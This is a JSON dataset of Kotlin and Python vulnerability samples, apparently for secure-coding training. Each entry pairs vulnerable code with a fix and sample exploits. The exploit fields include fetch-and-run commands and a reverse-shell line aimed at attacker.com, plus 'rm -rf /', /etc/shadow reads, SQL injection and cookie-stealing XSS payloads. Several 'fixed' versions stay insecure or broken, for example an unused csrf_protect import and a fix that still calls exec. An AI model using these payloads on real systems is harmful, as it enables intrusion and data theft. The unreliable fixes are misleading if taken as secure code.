        "fixed_code": "fun handleRequest(response: HttpServletResponse) {\n    response.setHeader(\"Content-Security-Policy\", \"default-src 'self'\")\n    response.setHeader(\"X-Frame-Options\", \"SAMEORIGIN\")\n    response.setHeader(\"X-XSS-Protection\", \"1; mode=block\")\n    response.setHeader(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\")\n    response.writer.write(\"Hello, World!\")\n}",
        "exploit_ways": [
            "Attacker can perform cross-site scripting (XSS) attacks due to the lack of Content Security Policy.",
            "Clickjacking attacks are possible as X-Frame-Options is not set.",
            "Cross-site request forgery (CSRF) may be more effective without appropriate security headers."
        ]
    },
    "kotlin_46": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "fun unsafeFunction() {\n    val sharedResource = StringBuilder()\n    Thread {\n        for (i in 0 until 1000) {\n            sharedResource.append(\"A\")\n        }\n    }.start()\n    Thread {\n        for (i in 0 until 1000) {\n            sharedResource.append(\"B\")\n        }\n    }.start()\n}",
        "cvss_score": 4.2,
        "fixed_code": "fun safeFunction() {\n    val sharedResource = StringBuilder()\n    val lock = Any()\n    Thread {\n        synchronized(lock) {\n            for (i in 0 until 1000) {\n                sharedResource.append(\"A\")\n            }\n        }\n    }.start()\n    Thread {\n        synchronized(lock) {\n            for (i in 0 until 1000) {\n                sharedResource.append(\"B\")\n            }\n        }\n    }.start()\n}",
        "exploit_ways": [
            "An attacker could cause the StringBuilder to produce inconsistent results by manipulating thread scheduling, leading to data corruption.",
            "If this function is part of a larger system where the output of sharedResource is critical, incorrect data could lead to unintended behavior or security vulnerabilities elsewhere in the application.",
            "In a multi-threaded environment, an attacker might exploit the race condition to inject malicious data into sharedResource, affecting other parts of the application that rely on this resource."
        ]
    },
    "kotlin_47": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import org.springframework.boot.SpringApplication\\nimport org.springframework.boot.autoconfigure.SpringBootApplication\\nimport org.springframework.web.bind.annotation.GetMapping\\nimport org.springframework.web.bind.annotation.RestController\\n\\n@SpringBootApplication\\nclass VulnerableApp {\\n\\n    @RestController\\n    class HelloController {\\n        @GetMapping(\\\"/hello\\\")\\n        fun sayHello(): String {\\n            return \\\"Hello, World!\\\"\\n        }\\n    }\\n}\\n\\nfun main(args: Array<String>) {\\n    SpringApplication.run(VulnerableApp::class.java, *args)\\n}",
        "cvss_score": 4.3,
        "fixed_code": "import org.springframework.boot.SpringApplication\\nimport org.springframework.boot.autoconfigure.SpringBootApplication\\nimport org.springframework.web.bind.annotation.GetMapping\\nimport org.springframework.web.bind.annotation.RestController\\nimport org.springframework.context.annotation.Bean\\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity\\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity\\nimport org.springframework.security.web.SecurityFilterChain\\n\\n@SpringBootApplication\\nclass SecureApp {\\n\\n    @RestController\\n    class HelloController {\\n        @GetMapping(\\\"/hello\\\")\\n        fun sayHello(): String {\\n            return \\\"Hello, World!\\\"\\n        }\\n    }\\n\\n    @EnableWebSecurity\\n    class SecurityConfig {\\n        @Bean\\n        fun securityFilterChain(http: HttpSecurity): SecurityFilterChain {\\n            http.headers().frameOptions().sameOrigin()\\n                .and().contentSecurityPolicy(\"default-src 'self'\")\\n                .and().xssProtection().block(true)\\n                .and().contentTypeOptions().and().httpStrictTransportSecurity().maxAgeInSeconds(31536000)\\n            return http.build()\\n        }\\n    }\\n}\\n\\nfun main(args: Array<String>) {\\n    SpringApplication.run(SecureApp::class.java, *args)\\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the application to steal user data.",
            "Cross-Site Scripting (XSS) attacks can manipulate content and perform actions on behalf of users.",
            "Clickjacking attacks can trick users into clicking buttons or links in a disguised iframe."
        ]
    },
    "kotlin_48": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import spark.Spark\nfun main() {\n    Spark.get(\"/\") { req, res -> \"Hello, World!\" }\n}",
        "cvss_score": 3.4,
        "fixed_code": "import spark.Spark\nfun main() {\n    Spark.init()\n    Spark.after { req, res ->\n        res.header(\"Content-Security-Policy\", \"default-src 'self'\")\n        res.header(\"X-Content-Type-Options\", \"nosniff\")\n        res.header(\"X-Frame-Options\", \"SAMEORIGIN\")\n        res.header(\"X-XSS-Protection\", \"1; mode=block\")\n    }\n    Spark.get(\"/\") { req, res -> \"Hello, World!\" }\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the response to perform XSS attacks.",
            "Lack of Content-Security-Policy allows loading resources from insecure origins, risking data theft.",
            "Without X-Frame-Options, an attacker could embed the site in a frame and trick users."
        ]
    },
    "kotlin_49": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "fun sensitiveData(): String {\\n    val secret = \"ThisIsASecretKey\"\\n    return if (System.getenv(\"DEBUG_MODE\") == \"true\") secret else \"Default Value\"\\n}",
        "cvss_score": 3.5,
        "fixed_code": "fun sensitiveData(): String {\\n    val secret = \"ThisIsASecretKey\"\\n    return \"Default Value\"\\n}",
        "exploit_ways": [
            "An attacker can set the DEBUG_MODE environment variable to 'true' to retrieve sensitive data.",
            "If running in a shared or insecure environment, other users could exploit this to access secret keys.",
            "In certain deployment scenarios, logs might include function outputs, inadvertently leaking secrets."
        ]
    },
    "python_0": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import os\\ndef read_file(file_path):\\n    base_directory = \"/safe_dir/\"\\n    if base_directory in file_path:\\n        full_path = os.path.join(base_directory, file_path.replace(base_directory, \"\", 1))\\n        with open(full_path, 'r') as file:\\n            return file.read()\\n    else:\\n        raise ValueError(\"Invalid path\")",
        "cvss_score": 6.5,
        "fixed_code": "import os\\ndef read_file(file_path):\\n    base_directory = \"/safe_dir/\"\\n    safe_path = os.path.join(base_directory, file_path.lstrip('/'))\\n    if os.path.commonprefix([os.path.abspath(safe_path), os.path.abspath(base_directory)]) != os.path.abspath(base_directory):\\n        raise ValueError(\"Invalid path\")\\n    with open(safe_path, 'r') as file:\\n        return file.read()",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the /etc/passwd file.",
            "They could use '../../secret/key.txt' to access files in parent directories.",
            "Input like '../../../../var/log/auth.log' might leak authentication logs."
        ]
    },
    "python_1": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "# Python example\nclass UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n    \n    def login(self, username, password):\n        return username == \"admin\" and password == \"password123\"",
        "cvss_score": 6.5,
        "fixed_code": "# Python example\nclass UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = self.hash_password(password)\n    \n    def hash_password(self, password):\n        import hashlib\n        return hashlib.sha256(password.encode()).hexdigest()\n    \n    def login(self, username, password):\n        hashed_input_password = self.hash_password(password)\n        return self.username == username and self.password == hashed_input_password",
        "exploit_ways": [
            "An attacker can use the hardcoded credentials 'admin'/'password123' to gain unauthorized access.",
            "By using brute force, an attacker could try common passwords to find the correct login.",
            "If user enumeration is possible, attackers may target known usernames like 'admin'."
        ]
    },
    "python_2": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "# Python example\ndef obfuscated_eval(encoded_command):\n    import base64\n    exec(base64.b64decode(encoded_command).decode('utf-8'))",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\ndef safe_obfuscated_eval(encoded_command):\n    import base64\n    command = base64.b64decode(encoded_command).decode('utf-8')\n    allowed_commands = ['ls', 'whoami']\n    if any(command.startswith(cmd) for cmd in allowed_commands):\n        exec(command)\n    else:\n        print(\"Command not allowed\")",
        "exploit_ways": [
            "An attacker can encode a command like 'rm -rf /' and pass it to obfuscated_eval to delete system files.",
            "Encoded command 'curl attacker.com/malware.sh | sh' can be used to execute remote malicious code.",
            "Chain commands such as 'ls; cat /etc/passwd' encoded and passed to exploit for leaking sensitive information."
        ]
    },
    "python_3": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import subprocess\nclass VulnerableClass:\n    def execute_command(self, cmd):\n        result = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        output, error = result.communicate()\n        if error:\n            return f'Error: {error.decode()}'\n        else:\n            return f'Result: {output.decode()}'",
        "cvss_score": 7.5,
        "fixed_code": "import subprocess\nfrom shlex import split\nclass SecureClass:\n    def execute_command(self, cmd):\n        safe_cmd = split(cmd)\n        result = subprocess.Popen(safe_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        output, error = result.communicate()\n        if error:\n            return f'Error: {error.decode()}'\n        else:\n            return f'Result: {output.decode()}'",
        "exploit_ways": [
            "An attacker can inject 'ls; rm -rf /' to delete system files after listing contents.",
            "They could use 'whoami' followed by other commands like '; curl http://attacker.com/shell.sh | bash' to download and execute a shell script.",
            "By using 'ps aux', an attacker can list running processes, then append '; killall -9 appname' to terminate specific applications."
        ]
    },
    "python_4": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "# Python example\nimport sqlite3\ndef fetch_user_data(user_id):\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = '\" + user_id + \"'\"\n    cursor.execute(query)\n    result = cursor.fetchall()\n    conn.close()\n    return result",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\nimport sqlite3\ndef fetch_user_data(user_id):\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = ?\"\n    cursor.execute(query, (user_id,))\n    result = cursor.fetchall()\n    conn.close()\n    return result",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve data for all users.",
            "They could use a UNION SELECT statement to extract sensitive information from other tables.",
            "Input like '; DROP TABLE users' might be used to delete the users table."
        ]
    },
    "python_5": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "# Python example\nfrom flask import Flask, request, redirect\napp = Flask(__name__)\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    amount = request.form['amount']\n    recipient = request.form['recipient']\n    # Simulate transferring funds\n    print(f'Transferring {amount} to {recipient}')\n    return redirect('/')",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\nfrom flask import Flask, request, redirect, session, render_template_string\nimport os\napp = Flask(__name__)\napp.secret_key = os.urandom(24)\n@app.route('/transfer', methods=['GET', 'POST'])\ndef transfer():\n    if request.method == 'POST':\n        form_token = request.form.get('csrf_token')\n        session_token = session.pop('csrf_token', None)\n        if not (form_token and form_token == session_token):\n            return 'Invalid CSRF token', 403\n        amount = request.form['amount']\n        recipient = request.form['recipient']\n        # Simulate transferring funds\n        print(f'Transferring {amount} to {recipient}')\n        return redirect('/')\n    session['csrf_token'] = os.urandom(24).hex()\n    form_html = \"\"\"\n<form action=\"/transfer\" method=\"post\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"{{ csrf_token }}\">\n  Amount: <input type=\"text\" name=\"amount\"><br>\n  Recipient: <input type=\"text\" name=\"recipient\"><br>\n  <input type=\"submit\" value=\"Transfer\">\n</form>\"\"\"\n    return render_template_string(form_html, csrf_token=session['csrf_token'])",
        "exploit_ways": [
            "An attacker can craft a malicious form that submits a transfer request to the victim's browser without their knowledge.",
            "By tricking the user into visiting a crafted URL or clicking on a link, an attacker can execute unauthorized transactions in the name of the user.",
            "Using social engineering tactics, attackers can prompt users to perform actions on a compromised website that triggers a CSRF attack."
        ]
    },
    "python_6": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n    \n    def authenticate(self, input_username, input_password):\n        if input_username == self.username and input_password == self.password:\n            return True\n        else:\n            return False",
        "cvss_score": 7.5,
        "fixed_code": "class UserAuth:\n    import bcrypt\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())\n\n    def authenticate(self, input_username, input_password):\n        return self.username == input_username and bcrypt.checkpw(input_password.encode('utf-8'), self.password_hash)",
        "exploit_ways": [
            "An attacker with knowledge of the username could brute force the password.",
            "If the password is weak or reused, it can be easily guessed or cracked using rainbow tables.",
            "An insider or malicious actor with access to the codebase could directly read the stored password and authenticate."
        ]
    },
    "python_7": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "# Python example\ndef get_user_data(user_id):\n    import sqlite3\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = \" + user_id\n    cursor.execute(query)\n    return cursor.fetchall()",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\ndef get_user_data(user_id):\n    import sqlite3\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = ?\"\n    cursor.execute(query, (user_id,))\n    return cursor.fetchall()",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user data.",
            "Using a payload like '1; DROP TABLE users;' could delete the entire users table.",
            "Inputting '1 UNION SELECT username, password FROM admin_table' may expose sensitive admin credentials."
        ]
    },
    "python_8": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "# Python example\\nimport hashlib\\ndef authenticate(username, password):\\n    stored_password_hash = '2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b'\\n    password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and stored_password_hash == password_hash:\\n        return True\\n    else:\\n        return False",
        "cvss_score": 6.5,
        "fixed_code": "# Python example\\nimport bcrypt\\ndef authenticate(username, password):\\n    stored_password_hash = b'$2b$12$KIXcVnWqG4jZr0sNlXkE/uPpA3yH0mOvTJ0C5w6R9UxQYRYh8zV3e' # bcrypt hash of 'password123'\\n    password_hash = bcrypt.hashpw(password.encode(), stored_password_hash)\\n    if username == 'admin' and bcrypt.checkpw(password.encode(), stored_password_hash):\\n        return True\\n    else:\\n        return False",
        "exploit_ways": [
            "An attacker could use a rainbow table to find the password for the MD5 hash.",
            "Since the hash is hardcoded, if the code is obtained, the hash can be cracked offline.",
            "If an attacker gains access to the source code, they can easily extract the admin credentials."
        ]
    },
    "python_9": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import os\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/file')\ndef get_file():\n    filename = request.args.get('filename', '')\n    if '..' not in filename and '.py' not in filename:\n        return open(os.path.join('data', filename)).read()\n    else:\n        return 'Invalid file name'",
        "cvss_score": 6.5,
        "fixed_code": "import os\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/file')\ndef get_file():\n    filename = request.args.get('filename', '')\n    allowed_files = [f for f in os.listdir('data') if not f.endswith('.py')]\n    if filename in allowed_files:\n        return open(os.path.join('data', filename)).read()\n    else:\n        return 'Invalid file name'",
        "exploit_ways": [
            "User could input '../../../../etc/passwd' to read the system's passwd file.",
            "Could use '../..' to traverse directories and access files outside the intended directory.",
            "If other sensitive files are present, they can be accessed by manipulating the filename parameter."
        ]
    },
    "python_10": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "from flask import Flask, request, redirect\r\napp = Flask(__name__)\r\n\r\n@app.route('/change_email', methods=['POST'])\r\ndef change_email():\r\n    new_email = request.form['email']\r\n    user_id = request.cookies.get('user_id')\r\n    if user_id:\r\n        # Simulate database update\r\n        print(f\"Updating email for user {user_id} to {new_email}\")\r\n        return redirect('/profile')\r\n    else:\r\n        return 'User not logged in', 401\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)",
        "cvss_score": 6.8,
        "fixed_code": "from flask import Flask, request, redirect, session\r\nimport os\r\napp = Flask(__name__)\r\napp.secret_key = os.urandom(24)\r\n\r\n@app.route('/change_email', methods=['POST'])\r\ndef change_email():\r\n    if 'csrf_token' in session and request.form['csrf_token'] == session['csrf_token']:\r\n        new_email = request.form['email']\r\n        user_id = request.cookies.get('user_id')\r\n        if user_id:\r\n            # Simulate database update\r\n            print(f\"Updating email for user {user_id} to {new_email}\")\r\n            return redirect('/profile')\r\n    return 'Invalid CSRF token', 403\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)",
        "exploit_ways": [
            "An attacker can craft a malicious web page that submits a form to change the victim's email address without their consent.",
            "They could use JavaScript in a phishing email to automatically submit a request to change the email when the user visits a compromised site while logged into the application.",
            "The attacker could generate a series of such requests targeting multiple users to\u6279\u91cf change their email addresses."
        ]
    },
    "python_11": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "# Python example\ndef read_file(filename):\n    with open(filename, 'r') as file:\n        return file.read()\n\nprint(read_file(input(\"Enter filename: \")))",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\ndef read_file(filename):\n    import os\n    safe_path = os.path.join(os.getcwd(), 'allowed_directory', filename)\n    if not os.path.commonpath([os.path.abspath(safe_path), os.path.abspath('allowed_directory')]) == os.path.abspath('allowed_directory'):\n        raise ValueError(\"Access denied\")\n    with open(safe_path, 'r') as file:\n        return file.read()\n\nprint(read_file(input(\"Enter filename: \")))",
        "exploit_ways": [
            "An attacker could input \"../etc/passwd\" to read sensitive system files.",
            "Could use relative paths like \"../../flag.txt\" to access files outside the intended directory.",
            "Inputting a crafted path with null bytes or other encoding tricks might bypass simple validation."
        ]
    },
    "python_12": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "def transfer_funds(request):\n    if request.method == 'POST':\n        amount = request.POST.get('amount')\n        recipient = request.POST.get('recipient')\n        # Simulate a fund transfer\n        print(f'Transferring {amount} to {recipient}')",
        "cvss_score": 8.5,
        "fixed_code": "from django.views.decorators.csrf import csrf_protect\ndef transfer_funds(request):\n    if request.method == 'POST':\n        amount = request.POST.get('amount')\n        recipient = request.POST.get('recipient')\n        # Simulate a fund transfer\n        print(f'Transferring {amount} to {recipient}')",
        "exploit_ways": [
            "An attacker could craft a malicious link or form that, when visited by the user, transfers funds without their consent.",
            "By using social engineering tactics, an attacker can trick users into clicking on a crafted URL that executes a CSRF attack and transfers money from their account to the attacker's account.",
            "The attacker can create a hidden iframe in another website that submits a POST request to the vulnerable application, exploiting the user's authenticated session."
        ]
    },
    "python_13": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "def login(username, password):\n    if username == \"admin\" and password == \"password123\":\n        return True\n    else:\n        return False",
        "cvss_score": 6.5,
        "fixed_code": "from werkzeug.security import check_password_hash\n\ndef hash_password(password):\n    # In practice, use a strong hashing function like bcrypt\n    return generate_password_hash(password)\n\ndef verify_password(stored_password, provided_password):\n    return check_password_hash(stored_password, provided_password)\n\nadmin_password_hash = hash_password('password123')\ndef login(username, password):\n    if username == 'admin' and verify_password(admin_password_hash, password):\n        return True\n    else:\n        return False",
        "exploit_ways": [
            "An attacker can easily guess the default credentials (admin/password123).",
            "If the hash function is weak or known, they could try brute-forcing the password.",
            "The hardcoded password makes it easy for attackers to gain unauthorized access if they get the source code."
        ]
    },
    "python_14": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "# Python example\\nimport hashlib\\n\\ndef authenticate(username, password):\\n    stored_password_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\\n    input_password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and input_password_hash == stored_password_hash:\\n        return True\\n    return False",
        "cvss_score": 6.5,
        "fixed_code": "# Python example\\nimport bcrypt\\ndef authenticate(username, password):\\n    stored_password_hash = b'$2b$12$84FZqLwPvRc6CJlXpZ30aeG7fDdK9iXuS5eVjU0tT.ao.GkN/6HPS'  # bcrypt hash for 'password'\\n    if username == 'admin' and bcrypt.checkpw(password.encode(), stored_password_hash):\\n        return True\\n    return False",
        "exploit_ways": [
            "An attacker can brute-force the password since MD5 is a fast hashing algorithm.",
            "Using rainbow table attacks, an attacker can quickly reverse-engineer the hashed password '5f4dcc3b5aa765d61d8327deb882cf99'.",
            "An attacker could try common default passwords or patterns to gain access."
        ]
    },
    "python_15": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "# Python example\nclass VulnerableClass:\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('touch /tmp/exploit')\",))",
        "cvss_score": 8.2,
        "fixed_code": "# Python example\nclass SafeClass:\n    def __reduce__(self):\n        # Secure method that does not execute arbitrary code\n        return (str, ('SafeObject',))",
        "exploit_ways": [
            "An attacker could deserialize a malicious payload to execute arbitrary commands on the server.",
            "Could use this vulnerability to create, modify, or delete files on the system.",
            "Potential for executing remote code if the deserialized data can be controlled by an external actor."
        ]
    },
    "python_16": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "# Python example\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\ndef generate_csrf_token():\n    return 'random_token_here'\n@app.route('/transfer', methods=['GET', 'POST'])\ndef transfer():\n    if request.method == 'POST':\n        recipient = request.form['recipient']\n        amount = request.form['amount']\n        # Simulate a bank transfer\n        print(f'Transferring {amount} to {recipient}')\n        return render_template_string('<h1>Transfer successful</h1>')\n    else:\n        token = generate_csrf_token()\n        return render_template_string('<form method=\"post\" action=\"/transfer\"><input type=\"hidden\" name=\"csrf_token\" value=\"{{token}}\"><input type=\"text\" name=\"recipient\"><input type=\"number\" name=\"amount\"><button type=\"submit\">Transfer</button></form>')",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\nfrom flask import Flask, request, render_template_string, session\napp = Flask(__name__)\napp.secret_key = 'super_secret_key'\ndef generate_csrf_token():\n    if '_csrf_token' not in session:\n        from os import urandom\n        session['_csrf_token'] = urandom(24).hex()\n    return session['_csrf_token']\ndef valid_csrf(request):\n    token = session.pop('_csrf_token', None)\n    if not token or token != request.form.get('csrf_token'):\n        return False\n    return True\n@app.route('/transfer', methods=['GET', 'POST'])\ndef transfer():\n    if request.method == 'POST':\n        if not valid_csrf(request):\n            return render_template_string('<h1>Invalid CSRF token</h1>'), 403\n        recipient = request.form['recipient']\n        amount = request.form['amount']\n        # Simulate a bank transfer\n        print(f'Transferring {amount} to {recipient}')\n        return render_template_string('<h1>Transfer successful</h1>')\n    else:\n        token = generate_csrf_token()\n        return render_template_string('<form method=\"post\" action=\"/transfer\"><input type=\"hidden\" name=\"csrf_token\" value=\"{{token}}\"><input type=\"text\" name=\"recipient\"><input type=\"number\" name=\"amount\"><button type=\"submit\">Transfer</button></form>')",
        "exploit_ways": [
            "An attacker can create a malicious webpage that, when visited by an authenticated user, sends a request to the /transfer endpoint without their knowledge.",
            "Using social engineering, attackers can trick users into clicking on links or submitting forms hosted on the attacker's site, which automatically includes the CSRF token from the victim's session cookie.",
            "An attacker could send crafted HTTP requests with JavaScript in phishing emails that execute unauthorized actions on behalf of the user if they are logged into the application."
        ]
    },
    "python_17": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "class UserSession:\n    def __init__(self, user_id):\n        self.user_id = user_id\n\n    def transfer_funds(self, amount, recipient):\n        if not self.is_authenticated():\n            raise Exception('User not authenticated')\n        # Simulate fund transfer\n        print(f'Transferring {amount} to {recipient}')\n\n    def is_authenticated(self):\n        return True  # This should check for actual authentication",
        "cvss_score": 6.5,
        "fixed_code": "class UserSession:\n    def __init__(self, user_id, csrf_token):\n        self.user_id = user_id\n        self.csrf_token = csrf_token\n\n    def transfer_funds(self, amount, recipient, token):\n        if not self.is_authenticated() or token != self.csrf_token:\n            raise Exception('User not authenticated or invalid CSRF token')\n        # Simulate fund transfer\n        print(f'Transferring {amount} to {recipient}')\n\n    def is_authenticated(self):\n        return True  # This should check for actual authentication",
        "exploit_ways": [
            "An attacker could craft a malicious web page that, when visited by an authenticated user, sends a request to transfer funds without their knowledge.",
            "Using social engineering tactics, attackers can trick users into clicking links or submitting forms that contain malicious CSRF tokens.",
            "If the CSRF token is predictable or reused, an attacker might guess or reuse it to perform unauthorized actions on behalf of the user."
        ]
    },
    "python_18": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "# Python example\\nclass CommandExecutor:\\n    def execute(self, command):\\n        eval(command)",
        "cvss_score": 8.2,
        "fixed_code": "# Python example\\nclass SafeCommandExecutor:\\n    def execute(self, command):\\n        if command in ['allowed_command1', 'allowed_command2']:\\n            exec(command)\\n        else:\\n            raise ValueError('Command not allowed')",
        "exploit_ways": [
            "An attacker can input '__import__(\"os\").system(\"rm -rf /\")' to delete all files.",
            "Could use '\"__import__(\\\"subprocess\\\").check_output(\\\"whoami\\\")\"' to leak the current user.",
            "Malicious code like '\"__import__(\\\"socket\\\").socket().connect((\\\"attacker.com\\\", 1234))\"' can establish a reverse shell."
        ]
    },
    "python_19": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    return render_template_string(f'Hello {name}!')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "cvss_score": 6.1,
        "fixed_code": "from flask import Flask, request, escape, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    escaped_name = escape(name)\n    return render_template_string(f'Hello {escaped_name}!')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "exploit_ways": [
            "An attacker can input '<script>alert(\\'XSS\\')</script>' to trigger a pop-up in the user's browser.",
            "By using '<img src=x onerror=alert(1)>', an attacker could execute arbitrary JavaScript code if rendered in another user's context.",
            "Injecting '<a href=javascript:alert(document.cookie)>Click here</a>' can steal cookies or other sensitive data from a victim's browser."
        ]
    },
    "python_20": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "# Python example\ndef complex_unsafe_function(param):\n    import subprocess\n    command = ['echo', param]\n    subprocess.Popen(command, shell=True)",
        "cvss_score": 8.8,
        "fixed_code": "# Python example\ndef complex_safe_function(param):\n    import subprocess\n    command = ['echo', param]\n    subprocess.Popen(command, shell=False)",
        "exploit_ways": [
            "An attacker could inject '; rm -rf /' to delete all files on the system.",
            "Could use '; wget http://attacker.com/malware.sh -O - | sh' to download and execute malicious script.",
            "Chaining commands like '; cat /etc/passwd' can leak sensitive information."
        ]
    },
    "python_21": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import os\n\ndef execute_command(command):\n    try:\n        # Log command execution\n        with open(\"/var/log/command_log.txt\", \"a\") as log_file:\n            log_file.write(f\"Executing: {command}\\n\")\n        # Execute the command\n        os.system(command)\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")\n\nif __name__ == \"__main__\":\n    user_input = input(\"Enter a command to execute: \")\n    execute_command(user_input)",
        "cvss_score": 8.2,
        "fixed_code": "import os\nimport subprocess\n\ndef execute_command(command):\n    try:\n        # Log command execution\n        with open(\"/var/log/command_log.txt\", \"a\") as log_file:\n            log_file.write(f\"Executing: {command}\\n\")\n        # Execute the command safely\n        subprocess.run(command, shell=False)\n    except Exception as e:\n        print(f\"An error occurred: {str(e)}\")\n\nif __name__ == \"__main__\":\n    user_input = input(\"Enter a command to execute: \")\n    execute_command([user_input])",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete system files with elevated privileges.",
            "Could use 'sudo su -' followed by password guessing to gain root access.",
            "Could chain commands like 'id; sudo cat /etc/shadow' to leak sensitive data."
        ]
    },
    "python_22": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "import sqlite3\ndef get_user(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username='\" + username + \"'\"\n    cursor.execute(query)\n    user = cursor.fetchone()\n    conn.close()\n    return user",
        "cvss_score": 7.5,
        "fixed_code": "import sqlite3\ndef get_user(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username=?\"\n    cursor.execute(query, (username,))\n    user = cursor.fetchone()\n    conn.close()\n    return user",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to bypass authentication.",
            "They can use 'UNION SELECT' to extract data from other tables.",
            "Input like '; DROP TABLE users' can delete critical data."
        ]
    },
    "python_23": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "# Python example\ndef load_config(serialized):\n    import pickle\n    config = pickle.loads(serialized)\n    return config",
        "cvss_score": 8.2,
        "fixed_code": "# Python example\ndef load_config(serialized):\n    import json\n    try:\n        config = json.loads(serialized)\n    except json.JSONDecodeError as e:\n        raise ValueError(\"Invalid serialized data\") from e\n    return config",
        "exploit_ways": [
            "An attacker can serialize malicious Python objects to execute arbitrary code.",
            "They can inject payloads that perform unauthorized actions, such as deleting files or accessing sensitive data.",
            "Crafted input could lead to a denial of service by causing the application to hang indefinitely."
        ]
    },
    "python_24": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "# Python example\nclass SecureObject:\n    def __init__(self, data):\n        self.data = data\n    def serialize(self):\n        import pickle\n        return pickle.dumps(self)\n    @staticmethod\ndef deserialize(serialized_data):\n        import pickle\n        return pickle.loads(serialized_data)",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\nclass SecureObject:\n    def __init__(self, data):\n        self.data = data\n    def serialize(self):\n        import json\n        return json.dumps(self.__dict__)\n    @staticmethod\ndef deserialize(serialized_data):\n        import json\n        data = json.loads(serialized_data)\n        return SecureObject(data[\"data\"])",
        "exploit_ways": [
            "An attacker can craft a malicious payload to execute arbitrary code during deserialization.",
            "Could exploit the vulnerability to perform remote code execution by injecting a payload that executes system commands.",
            "Attacker may inject a payload that leads to denial of service by causing excessive resource consumption."
        ]
    },
    "python_25": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
